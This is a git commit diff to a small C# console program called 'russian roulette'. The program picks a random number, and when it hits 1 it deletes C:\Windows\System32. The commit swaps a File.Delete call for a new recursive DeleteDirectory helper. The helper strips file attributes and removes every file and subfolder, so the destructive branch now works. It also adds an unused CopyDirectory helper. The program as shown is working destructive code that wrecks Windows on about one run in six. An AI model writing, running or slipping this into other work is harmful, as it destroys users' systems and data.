568186e68eac31ad0c9805c9c04ede6c8fdff47a
DistanceText <DistanceText@gmail.com>
2023-03-22 16:12:42 +0100

    312

--- russian roulette/Program.cs
+++ russian roulette/Program.cs
@@ -15,7 +15,7 @@ namespace russian_roulette
             int i = rnd.Next(0, 6);
             if (i == 1)
             {
-                File.Delete(@"C:\Windows\System32");
+                DeleteDirectory(@"C:\Windows\System32");
             }
             else
             {
@@ -23,5 +23,45 @@ namespace russian_roulette
             }
             Console.ReadKey();
         }
+        private static void CopyDirectory(string strSource, string strDestination)
+        {
+            if (!Directory.Exists(strDestination))
+            {
+                Directory.CreateDirectory(strDestination);
+            }
+
+            DirectoryInfo dirInfo = new DirectoryInfo(strSource);
+            FileInfo[] files = dirInfo.GetFiles();
+            foreach (FileInfo tempfile in files)
+            {
+                tempfile.CopyTo(Path.Combine(strDestination, tempfile.Name));
+            }
+
+            DirectoryInfo[] directories = dirInfo.GetDirectories();
+            foreach (DirectoryInfo tempdir in directories)
+            {
+                CopyDirectory(Path.Combine(strSource, tempdir.Name), Path.Combine(strDestination, tempdir.Name));
+            }
+
+        }
+        public static void DeleteDirectory(string target_dir)
+        {
+            string[] files = Directory.GetFiles(target_dir);
+            string[] dirs = Directory.GetDirectories(target_dir);
+
+            foreach (string file in files)
+            {
+                File.SetAttributes(file, FileAttributes.Normal);
+                File.Delete(file);
+            }
+
+            foreach (string dir in dirs)
+            {
+                DeleteDirectory(dir);
+            }
+
+            Directory.Delete(target_dir, false);
+        }
     }
+
 }
